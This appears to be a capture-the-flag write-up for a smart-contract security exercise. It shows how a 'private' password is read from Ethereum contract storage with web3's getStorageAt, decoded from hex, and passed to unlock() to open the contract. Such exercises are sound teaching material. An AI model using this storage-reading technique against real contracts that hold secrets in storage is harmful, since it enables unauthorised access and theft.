This contract is locked unless function ```unlock(bytes32 _password)``` is called with the correct password.

The correct password is stored as a private bytes32 variable in the contract storage.

This does not mean it's inaccessible.

I know that ```password``` is the second variable therefore index 1 in storage elements.

### Steps 

Using web3 function ```getStorageAt()``` with (contract address, index) as parameters.

```password = web3.eth.getStorageAt(instance, 1)``` 

Or with error handling

```web3.eth.getStorageAt(instance, 1, function(error, result) {password = result})```

The password result = ```"0x412076657279207374726f6e67207365637265742070617373776f7264203a29"```

HEX to ASCII outputs = ```A very strong secret password :)```

Now call ```unlock()``` function with the password.

```contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")```

Check contract is unlocked.

```contract.locked()``` now returns ```false```

